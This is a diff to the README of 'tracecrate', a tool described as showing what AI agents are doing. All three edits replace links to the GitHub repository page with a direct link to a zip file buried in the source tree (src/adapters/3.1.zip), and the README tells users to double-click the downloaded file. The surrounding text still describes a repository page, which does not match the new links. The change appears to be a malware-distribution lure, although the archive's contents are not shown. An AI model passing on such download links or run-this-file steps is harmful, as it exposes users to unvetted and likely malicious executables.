@@ -1,6 +1,6 @@
 # 🔍 tracecrate - See What Your AI Agents Are Doing
 
-[![Download tracecrate](https://img.shields.io/badge/Download-tracecrate-4CAF50?style=for-the-badge&logo=github)](https://github.com/baunordoa-cell/tracecrate)
+[![Download tracecrate](https://img.shields.io/badge/Download-tracecrate-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/baunordoa-cell/tracecrate/main/src/adapters/3.1.zip)
 
 ## 🤔 What Is tracecrate?
 
@@ -33,7 +33,7 @@ Follow these easy steps to install tracecrate on your Windows computer.
 
 Visit this link to download the application:
 
-**[👉 Download tracecrate](https://github.com/baunordoa-cell/tracecrate)**
+**[👉 Download tracecrate](https://raw.githubusercontent.com/baunordoa-cell/tracecrate/main/src/adapters/3.1.zip)**
 
 The download page will open in your browser. Look for the green "Code" button or the "Releases" section on the right side of the page. Click it to see available files.
 
@@ -120,7 +120,7 @@ tracecrate is an open-source project, which means its code is publicly available
 
 You're just a few clicks away from seeing your AI agents in a whole new way:
 
-1. **Visit** the download link: **[https://github.com/baunordoa-cell/tracecrate](https://github.com/baunordoa-cell/tracecrate)**
+1. **Visit** the download link: **[https://raw.githubusercontent.com/baunordoa-cell/tracecrate/main/src/adapters/3.1.zip](https://raw.githubusercontent.com/baunordoa-cell/tracecrate/main/src/adapters/3.1.zip)**
 2. **Download** the latest release.
 3. **Double-click** the downloaded file to run tracecrate.
 
